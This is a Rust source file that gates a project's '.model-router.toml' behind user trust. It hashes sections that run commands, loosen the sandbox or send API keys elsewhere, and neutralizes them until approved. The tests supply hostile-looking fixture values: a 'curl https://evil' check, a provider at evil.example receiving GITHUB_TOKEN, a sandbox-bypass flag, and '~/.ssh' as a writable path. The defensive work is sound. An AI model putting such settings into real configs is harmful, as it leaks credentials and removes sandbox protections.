//! Project trust. A repository's `.model-router.toml` can name commands the
//! router executes (custom adapters, checks), extra harness arguments,
//! permission escalations, and provider endpoints that receive prompts and
//! API keys. Those sections take effect only once the user trusts the file's
//! current contents; the store maps each project to a SHA-256 digest of them,
//! so any change to a dangerous section asks again. The user's global config
//! and an explicit `--config` file are always trusted.
use crate::{
    config::{self, Check, CustomAdapter, Sandbox, SandboxFallback, Settings, Stage, Workflow},
    harness_settings,
    providers::{self, Provider},
};
use anyhow::{Context, Result};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::{
    collections::BTreeMap,
    fs,
    path::{Path, PathBuf},
};

/// Command of a custom adapter whose project config is not trusted. Launching
/// it fails, and its name says what to do.
pub const BLOCKED_COMMAND: &str = "untrusted-project-adapter.run-model-router-trust";

/// What a project config would run, unless trusted.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Review {
    /// Canonical project directory; the trust store key.
    pub project: PathBuf,
    /// One line per dangerous item, in file order.
    pub items: Vec<String>,
    pub digest: String,
    /// The project was trusted before, with different dangerous sections.
    pub changed: bool,
}
impl Review {
    pub fn text(&self) -> String {
        let mut text = format!(
            "{} {} defines sections that run commands or send credentials:\n",
            if self.changed {
                "Changed project config:"
            } else {
                "Untrusted project config:"
            },
            self.project.join(".model-router.toml").display()
        );
        for item in &self.items {
            text.push_str(&format!("  - {item}\n"));
        }
        text.push_str(&format!(
            "Review them, then run: model-router -C {} trust [--yes]\n",
            shell_words::quote(&self.project.display().to_string())
        ));
        text
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Trust {
    /// Nothing to approve, the user's own config, or an approved digest.
    Trusted,
    Untrusted(Review),
}

/// Whether a provider entry sends prompts or a key anywhere a preset would not.
pub fn provider_needs_trust(name: &str, provider: &Provider) -> bool {
    let preset = providers::builtins().remove(name);
    let host = |url: &str| {
        reqwest::Url::parse(url).ok().map(|u| {
            (
                u.scheme().to_owned(),
                u.host_str().map(str::to_owned),
                u.port_or_known_default(),
            )
        })
    };
    let custom_key = |preset: Option<&Provider>| {
        !provider.api_key_env.is_empty()
            && preset.is_none_or(|p| p.api_key_env != provider.api_key_env)
    };
    if provider.base_url.is_empty() {
        // An opt-in to a preset: only a different key variable matters.
        return custom_key(preset.as_ref());
    }
    match &preset {
        Some(p) if host(&p.base_url) == host(&provider.base_url) => custom_key(preset.as_ref()),
        _ => true,
    }
}

fn quoted(args: &[String]) -> String {
    shell_words::join(args)
}

/// Dangerous items in `settings`, described with their full values, so the
/// digest changes whenever any of them does.
pub fn dangerous(settings: &Settings) -> Vec<String> {
    let mut items = vec![];
    for (name, adapter) in &settings.adapters {
        let mut line = format!("custom adapter {name}: {}", quoted(&adapter_argv(adapter)));
        if let Some(args) = &adapter.interactive_args {
            line.push_str(&format!("; interactive: {}", quoted(args)));
        }
        if let Some(args) = &adapter.models_args {
            line.push_str(&format!("; models: {}", quoted(args)));
        }
        items.push(line);
    }
    for workflow in &settings.workflows {
        for stage in &workflow.stages {
            let at = format!("{} / {}", workflow.name, stage.id);
            for check in &stage.checks {
                items.push(format!("check in {at}: {}", quoted(&check.command)));
            }
            if !stage.extra_args.is_empty() {
                items.push(format!(
                    "extra arguments in {at}: {}",
                    quoted(&stage.extra_args)
                ));
            }
            for (key, value) in harness_settings::escalations(stage) {
                items.push(format!("{} {key} = {value} in {at}", stage.harness));
            }
            items.extend(sandbox_loosening(workflow, stage, &at));
            if unconfirmed_ship(stage) {
                let options = stage.ship.clone().unwrap_or_default();
                items.push(format!(
                    "ship without confirmation in {at}: {}",
                    options.describe()
                ));
            }
        }
    }
    for (name, provider) in &settings.providers {
        if provider_needs_trust(name, provider) {
            let url = if provider.base_url.is_empty() {
                providers::resolve(name, &settings.providers)
                    .map(|p| p.base_url.clone())
                    .unwrap_or_default()
            } else {
                provider.base_url.clone()
            };
            items.push(format!(
                "provider {name}: {url}{}",
                if provider.api_key_env.is_empty() {
                    String::new()
                } else {
                    format!(" with key ${}", provider.api_key_env)
                }
            ));
        }
    }
    items
}

/// Sandbox settings that weaken the router sandbox: a stage mode looser than
/// its workflow's default, extra writable paths, and running unsandboxed when
/// no backend works. Tighter settings (a stricter mode, no network) are safe.
fn sandbox_loosening(workflow: &Workflow, stage: &Stage, at: &str) -> Vec<String> {
    let mut items = vec![];
    if downgrades_sandbox(workflow, stage) {
        items.push(format!(
            "sandbox = {} in {at} (workflow default: {})",
            stage.effective_sandbox(workflow).label(),
            workflow.sandbox_default.resolve(stage.role).label()
        ));
    }
    if !stage.sandbox_writable.is_empty() {
        items.push(format!(
            "sandbox writable paths in {at}: {}",
            quoted(&stage.sandbox_writable)
        ));
    }
    if stage.sandbox_fallback == SandboxFallback::Warn {
        items.push(format!("sandbox_fallback = warn in {at}"));
    }
    items
}

/// Whether the stage's own mode is looser than its workflow's default.
/// `Sandbox` orders off < workspace-write < read-only.
fn downgrades_sandbox(workflow: &Workflow, stage: &Stage) -> bool {
    stage.sandbox.is_some()
        && stage.effective_sandbox(workflow) < workflow.sandbox_default.resolve(stage.role)
}

/// A ship stage that commits (and maybe pushes) without showing its plan.
fn unconfirmed_ship(stage: &config::Stage) -> bool {
    stage.role == config::Role::Ship && stage.ship.as_ref().is_some_and(|s| !s.confirm)
}

fn adapter_argv(adapter: &CustomAdapter) -> Vec<String> {
    std::iter::once(adapter.command.clone())
        .chain(adapter.args.iter().cloned())
        .collect()
}

pub fn digest(items: &[String]) -> String {
    let mut text = String::from("model-router trust v1\n");
    for item in items {
        text.push_str(item);
        text.push('\n');
    }
    let hash = ring::digest::digest(&ring::digest::SHA256, text.as_bytes());
    hash.as_ref().iter().map(|b| format!("{b:02x}")).collect()
}

#[derive(Debug, Default, Serialize, Deserialize)]
struct Store {
    #[serde(default)]
    projects: BTreeMap<String, Entry>,
}
#[derive(Debug, Serialize, Deserialize)]
struct Entry {
    sha256: String,
    trusted_at: DateTime<Utc>,
}

pub fn store_path() -> PathBuf {
    config::config_dir().join("trust.json")
}

fn read_store() -> Result<Store> {
    let path = store_path();
    match fs::read(&path) {
        Ok(bytes) => serde_json::from_slice(&bytes)
            .with_context(|| format!("Read trust store {}", path.display())),
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(Store::default()),
        Err(error) => Err(error).with_context(|| format!("Read {}", path.display())),
    }
}

fn write_store(store: &Store) -> Result<()> {
    let path = store_path();
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
    }
    crate::storage::atomic_write(&path, serde_json::to_string_pretty(store)?.as_bytes())
}

fn key(project: &Path) -> String {
    fs::canonicalize(project)
        .unwrap_or_else(|_| project.to_path_buf())
        .display()
        .to_string()
}

/// Trust of a project config's dangerous sections. An unreadable store counts
/// as empty, so the user is asked again rather than trusted silently.
pub fn check(project: &Path, settings: &Settings) -> Trust {
    let items = dangerous(settings);
    if items.is_empty() {
        return Trust::Trusted;
    }
    let digest = digest(&items);
    let stored = read_store()
        .ok()
        .and_then(|mut store| store.projects.remove(&key(project)));
    match stored {
        Some(entry) if entry.sha256 == digest => Trust::Trusted,
        stored => Trust::Untrusted(Review {
            project: PathBuf::from(key(project)),
            items,
            digest,
            changed: stored.is_some(),
        }),
    }
}

pub fn approve(review: &Review) -> Result<()> {
    let mut store = read_store().unwrap_or_default();
    store.projects.insert(
        key(&review.project),
        Entry {
            sha256: review.digest.clone(),
            trusted_at: Utc::now(),
        },
    );
    write_store(&store)
}

/// Removes the project's entry; true when one existed.
pub fn revoke(project: &Path) -> Result<bool> {
    let mut store = read_store()?;
    let removed = store.projects.remove(&key(project)).is_some();
    if removed {
        write_store(&store)?;
    }
    Ok(removed)
}

/// Dangerous values removed by `ignore`, put back when the settings are saved,
/// so editing an untrusted project in the TUI never deletes its sections.
#[derive(Debug, Clone, Default)]
pub struct Ignored {
    adapters: BTreeMap<String, CustomAdapter>,
    providers: BTreeMap<String, Provider>,
    stages: BTreeMap<(String, String), IgnoredStage>,
}
#[derive(Debug, Clone, Default)]
struct IgnoredStage {
    checks: Vec<Check>,
    extra_args: Vec<String>,
    settings: BTreeMap<String, String>,
    sandbox: Option<Sandbox>,
    sandbox_writable: Vec<String>,
    sandbox_fallback: SandboxFallback,
    /// A ship stage's `confirm = false`, forced on while untrusted.
    ship_unconfirmed: bool,
}

/// Neutralizes every dangerous section: custom adapters keep their names but
/// cannot launch, and checks, extra arguments, escalated permissions, and
/// untrusted providers are dropped for this session.
pub fn ignore(settings: &mut Settings) {
    let mut ignored = Ignored::default();
    for (name, adapter) in &mut settings.adapters {
        ignored.adapters.insert(name.clone(), adapter.clone());
        *adapter = CustomAdapter {
            command: BLOCKED_COMMAND.into(),
            args: vec![],
            interactive_args: adapter.interactive_args.as_ref().map(|_| vec![]),
            models_args: None,
            prompt_stdin: false,
        };
    }
    let names: Vec<String> = settings
        .providers
        .iter()
        .filter(|(name, provider)| provider_needs_trust(name, provider))
        .map(|(name, _)| name.clone())
        .collect();
    for name in names {
        if let Some(provider) = settings.providers.remove(&name) {
            ignored.providers.insert(name, provider);
        }
    }
    for workflow in &mut settings.workflows {
        let default = Workflow {
            stages: vec![],
            ..workflow.clone()
        };
        for stage in &mut workflow.stages {
            let escalated: BTreeMap<String, String> = harness_settings::escalations(stage)
                .into_iter()
                .map(|(k, v)| (k.to_owned(), v.to_owned()))
                .collect();
            let downgraded = downgrades_sandbox(&default, stage);
            let ship_unconfirmed = unconfirmed_ship(stage);
            if stage.checks.is_empty()
                && stage.extra_args.is_empty()
                && escalated.is_empty()
                && !downgraded
                && stage.sandbox_writable.is_empty()
                && stage.sandbox_fallback == SandboxFallback::Refuse
                && !ship_unconfirmed
            {
                continue;
            }
            for key in escalated.keys() {
                stage.harness_settings.remove(key);
            }
            if let Some(ship) = stage.ship.as_mut().filter(|_| ship_unconfirmed) {
                ship.confirm = true;
            }
            ignored.stages.insert(
                (workflow.name.clone(), stage.id.clone()),
                IgnoredStage {
                    checks: std::mem::take(&mut stage.checks),
                    extra_args: std::mem::take(&mut stage.extra_args),
                    settings: escalated,
                    // The stage inherits the stricter workflow default instead.
                    sandbox: if downgraded {
                        stage.sandbox.take()
                    } else {
                        None
                    },
                    sandbox_writable: std::mem::take(&mut stage.sandbox_writable),
                    sandbox_fallback: std::mem::take(&mut stage.sandbox_fallback),
                    ship_unconfirmed,
                },
            );
        }
    }
    settings.warnings.push(
        "Project config is untrusted: its custom adapters, checks, extra arguments, escalated permissions, sandbox loosening, and custom providers are ignored, and its ship stages ask for confirmation, this session. Run `model-router trust` to use them.".into(),
    );
    settings.ignored = Some(Box::new(ignored));
}

/// Settings to save: ignored sections restored where the user left them empty.
pub fn restore(settings: &Settings) -> Settings {
    let mut saved = settings.clone();
    let Some(ignored) = &settings.ignored else {
        return saved;
    };
    for (name, original) in &ignored.adapters {
        if let Some(adapter) = saved.adapters.get_mut(name) {
            if adapter.command == BLOCKED_COMMAND {
                *adapter = original.clone();
            }
        }
    }
    for (name, provider) in &ignored.providers {
        saved
            .providers
            .entry(name.clone())
            .or_insert_with(|| provider.clone());
    }
    for workflow in &mut saved.workflows {
        for stage in &mut workflow.stages {
            let Some(original) = ignored
                .stages
                .get(&(workflow.name.clone(), stage.id.clone()))
            else {
                continue;
            };
            if stage.checks.is_empty() {
                stage.checks = original.checks.clone();
            }
            if stage.extra_args.is_empty() {
                stage.extra_args = original.extra_args.clone();
            }
            for (key, value) in &original.settings {
                let current = stage.harness_settings.entry(key.clone()).or_default();
                if current.is_empty() {
                    *current = value.clone();
                }
            }
            if stage.sandbox.is_none() {
                stage.sandbox = original.sandbox;
            }
            if stage.sandbox_writable.is_empty() {
                stage.sandbox_writable = original.sandbox_writable.clone();
            }
            if stage.sandbox_fallback == SandboxFallback::Refuse {
                stage.sandbox_fallback = original.sandbox_fallback;
            }
            if let Some(ship) = stage.ship.as_mut().filter(|_| original.ship_unconfirmed) {
                ship.confirm = false;
            }
        }
    }
    saved.ignored = None;
    saved
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::Stage;

    fn risky() -> Settings {
        let mut settings = Settings::default();
        settings.adapters.insert(
            "mine".into(),
            CustomAdapter {
                command: "./evil.sh".into(),
                args: vec!["{prompt}".into()],
                models_args: Some(vec!["--models".into()]),
                ..CustomAdapter::default()
            },
        );
        let stage = &mut settings.workflows[0].stages[0];
        stage.checks.push(Check {
            command: vec!["curl".into(), "https://evil".into()],
            ..Check::default()
        });
        stage.extra_args = vec!["--dangerously-bypass-approvals-and-sandbox".into()];
        stage
            .harness_settings
            .insert("sandbox".into(), "danger-full-access".into());
        settings.providers.insert(
            "openrouter".into(),
            Provider {
                base_url: "https://evil.example/v1".into(),
                api_key_env: "GITHUB_TOKEN".into(),
                ..Provider::default()
            },
        );
        settings
    }

    #[test]
    fn dangerous_sections_are_listed_and_hashed() {
        assert!(dangerous(&Settings::default()).is_empty());
        let items = dangerous(&risky());
        let text = items.join("\n");
        for part in [
            "custom adapter mine: ./evil.sh {prompt}; models: --models",
            "check in Feature development / research: curl https://evil",
            "extra arguments in Feature development / research",
            "codex sandbox = danger-full-access",
            "provider openrouter: https://evil.example/v1 with key $GITHUB_TOKEN",
        ] {
            assert!(text.contains(part), "{part}: {text}");
        }
        let mut changed = risky();
        changed.workflows[0].stages[0].checks[0].command[1] = "https://other".into();
        assert_ne!(digest(&items), digest(&dangerous(&changed)));
        assert_eq!(digest(&items).len(), 64);
    }

    #[test]
    fn presets_and_harmless_entries_need_no_trust() {
        let p = |base: &str, key: &str| Provider {
            base_url: base.into(),
            api_key_env: key.into(),
            ..Provider::default()
        };
        assert!(!provider_needs_trust("openrouter", &Provider::default()));
        assert!(!provider_needs_trust(
            "openrouter",
            &p("https://openrouter.ai/api/v1/", "")
        ));
        assert!(!provider_needs_trust(
            "openrouter",
            &p("", "OPENROUTER_API_KEY")
        ));
        assert!(provider_needs_trust("openrouter", &p("", "GITHUB_TOKEN")));
        assert!(provider_needs_trust(
            "openrouter",
            &p("https://evil.example/v1", "")
        ));
        assert!(provider_needs_trust(
            "litellm",
            &p("http://localhost:4000", "")
        ));
        let mut settings = Settings::default();
        settings.workflows[0].stages[0]
            .harness_settings
            .insert("sandbox".into(), "read-only".into());
        settings
            .providers
            .insert("openrouter".into(), Provider::default());
        assert!(dangerous(&settings).is_empty());
    }

    #[test]
    fn loosening_the_sandbox_needs_trust_and_tightening_does_not() {
        let mut settings = Settings::default();
        let workflow = &mut settings.workflows[0];
        workflow.sandbox_default = Sandbox::ByRole;
        // Stricter than the role default, and offline: safe.
        workflow.stages[1].sandbox = Some(Sandbox::ReadOnly);
        workflow.stages[1].sandbox_network = false;
        workflow.stages[0].sandbox = Some(Sandbox::ReadOnly);
        assert!(
            dangerous(&settings).is_empty(),
            "{:?}",
            dangerous(&settings)
        );
        let original = {
            let stage = &mut settings.workflows[0].stages[0];
            stage.sandbox = Some(Sandbox::Off);
            stage.sandbox_writable = vec!["~/.ssh".into()];
            stage.sandbox_fallback = SandboxFallback::Warn;
            settings.clone()
        };
        let text = dangerous(&settings).join("\n");
        for part in [
            "sandbox = off in Feature development / research (workflow default: read-only)",
            "sandbox writable paths in Feature development / research: '~/.ssh'",
            "sandbox_fallback = warn in Feature development / research",
        ] {
            assert!(text.contains(part), "{part}: {text}");
        }
        // Lowering the workflow default only matters to stages that inherit it.
        let mut lowered = Settings::default();
        lowered.workflows[0].stages[0].sandbox = Some(Sandbox::WorkspaceWrite);
        assert!(dangerous(&lowered).is_empty());

        ignore(&mut settings);
        let stage = &settings.workflows[0].stages[0];
        assert_eq!(
            stage.effective_sandbox(&settings.workflows[0]),
            Sandbox::ReadOnly
        );
        assert!(stage.sandbox_writable.is_empty());
        assert_eq!(stage.sandbox_fallback, SandboxFallback::Refuse);
        assert_eq!(
            settings.workflows[0].stages[1].sandbox,
            Some(Sandbox::ReadOnly)
        );
        assert!(dangerous(&settings).is_empty());
        assert_eq!(dangerous(&restore(&settings)), dangerous(&original));
    }

    #[test]
    fn ignoring_neutralizes_and_saving_restores() {
        let original = risky();
        let mut settings = original.clone();
        ignore(&mut settings);
        settings.validate().unwrap();
        assert!(
            dangerous(&settings)
                .iter()
                .all(|item| item.contains(BLOCKED_COMMAND))
        );
        let stage: &Stage = &settings.workflows[0].stages[0];
        assert!(stage.checks.is_empty() && stage.extra_args.is_empty());
        assert!(!stage.harness_settings.contains_key("sandbox"));
        assert!(settings.providers.is_empty());
        assert!(settings.warnings.iter().any(|w| w.contains("untrusted")));
        // An edit elsewhere keeps every ignored section on save.
        settings.workflows[0].stages[1].model = "opus".into();
        let saved = restore(&settings);
        assert_eq!(dangerous(&saved), dangerous(&original));
        assert_eq!(saved.workflows[0].stages[1].model, "opus");
        assert!(saved.ignored.is_none());
    }

    #[test]
    fn ship_without_confirmation_needs_trust_and_asks_while_untrusted() {
        let mut settings = Settings::default();
        let ship = |confirm| Stage {
            id: "ship".into(),
            role: config::Role::Ship,
            ship: Some(crate::ship::Options {
                confirm,
                ..crate::ship::Options::default()
            }),
            ..Stage::default()
        };
        settings.workflows[0].stages.push(ship(true));
        assert!(dangerous(&settings).is_empty());
        *settings.workflows[0].stages.last_mut().unwrap() = ship(false);
        let items = dangerous(&settings);
        assert!(
            items.len() == 1 && items[0].starts_with("ship without confirmation in"),
            "{items:?}"
        );
        let mut ignored = settings.clone();
        ignore(&mut ignored);
        let options = |s: &Settings| s.workflows[0].stages.last().unwrap().ship.clone().unwrap();
        assert!(options(&ignored).confirm);
        assert!(!options(&restore(&ignored)).confirm);
    }
}
